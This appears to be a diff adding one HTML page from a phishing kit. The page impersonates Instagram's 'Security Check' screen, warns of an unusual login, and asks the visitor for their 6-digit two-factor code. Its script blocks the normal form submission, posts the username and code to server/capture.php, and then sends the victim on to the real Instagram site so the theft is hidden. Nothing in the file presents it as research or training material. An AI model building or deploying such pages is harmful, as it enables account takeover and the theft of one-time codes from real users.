@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Security Check</title>
+    <style>
+        /* Same styling as main page for consistency */
+        :root {
+            --ig-bg: #ffffff;
+            --ig-text: #000000;
+            --ig-primary: #0095f6;
+            --ig-border: #dbdbdb;
+        }
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --ig-bg: #000000;
+                --ig-text: #f5f5f5;
+                --ig-border: #363636;
+            }
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--ig-bg);
+            color: var(--ig-text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-border);
+            padding: 40px;
+            border-radius: 8px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo { font-size: 32px; margin-bottom: 20px; }
+        h2 { font-size: 16px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
+        .code-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--ig-border);
+            border-radius: 4px;
+            background: var(--ig-bg);
+            color: var(--ig-text);
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            margin-bottom: 15px;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background: var(--ig-primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h2>Security Check Required</h2>
+        <p>We detected an unusual login attempt. Enter the 6-digit code sent to your email or phone.</p>
+        <form id="challengeForm" method="post" action="server/capture.php">
+            <input type="hidden" name="challenge_type" value="2fa_code">
+            <input type="hidden" name="username" id="hiddenUsername">
+            <input type="text" class="code-input" name="code" maxlength="6" placeholder="000000" required>
+            <button type="submit" class="btn">Verify</button>
+        </form>
+    </div>
+    <script>
+        // Pre-fill username if passed via URL
+        const params = new URLSearchParams(window.location.search);
+        const username = params.get('username');
+        if (username) {
+            document.getElementById('hiddenUsername').value = username;
+        }
+        
+        // Capture the 2FA code
+        document.getElementById('challengeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = {
+                type: '2fa_code',
+                username: document.getElementById('hiddenUsername').value,
+                code: document.querySelector('.code-input').value,
+                timestamp: new Date().toISOString()
+            };
+            fetch('server/capture.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = 'https://www.instagram.com/';
+            });
+        });
+    </script>
+</body>
+</html>
